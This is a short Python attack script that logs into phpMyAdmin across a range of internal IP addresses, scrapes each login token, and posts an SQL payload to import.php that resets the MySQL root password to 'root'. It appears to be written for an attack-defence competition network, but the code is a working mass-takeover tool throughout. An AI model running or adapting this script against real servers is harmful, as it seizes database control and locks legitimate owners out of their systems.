# -*- coding: utf-8 -*-
__author__='Smi1e'

import requests
import re

def login(url,username,password):

	session = requests.session()
	req = session.get(url=url)
	text = req.text
	token = re.findall(r"\"(\w+)\"",text)[-2]

	url = url+token

	data = {
	'pma_username' : username,
	'pma_password' : password,
	'server' : 1,
	'token' : token
	}

	try:
		a=session.post(url=url,data=data,timeout=5)
		#print(a.text)
	except:
		pass

	return session,token

def get_url(url,username,password,sql_payload):
	req=change_password(url,username,password,sql_payload)

	if req != False:
		if "\"success\":true" in req.text:
			#print(req.text)
			print("[+]success："+url)
		else:
			print("[+]error："+url)

def change_password(url,username,password,sql_payload):

	login_url = url + "index.php?"
	session,token = login(login_url,username,password)
	change_password_url = url+"import.php"

	data = {
	'is_js_confirmed' : 0,
	'token' : token,
	'pos' : 0,
	'goto' : 'server_sql.php',
	'prev_sql_query' : '',
	'sql_query' : sql_payload,
	'sql_delimiter' : '%3B',
	'show_query' : 1,
	'ajax_request' : 'true'
	}
	try:
		req = session.post(url=change_password_url,data=data,timeout=5)
		#print(req.text)
		return req
	except:
		pass

if __name__ == '__main__':
	username = "root"
	password = "your_mysql_password"
	sql_payload = "set password for root@localhost = password('root');"
	#URL需要含有phpmyadmin的名字
	#phpMyAdmin_url = "http://localhost/phpMyAdmin/"
	#get_url(phpMyAdmin_url,username,password,sql_payload)
	hosts = ['172.16.5.{}'.format(i) for i in range(10, 38)]
	for ip in hosts:
		phpMyAdmin_url = "http://"+ip+"/phpMyAdmin/"
		get_url(phpMyAdmin_url,username,password,sql_payload)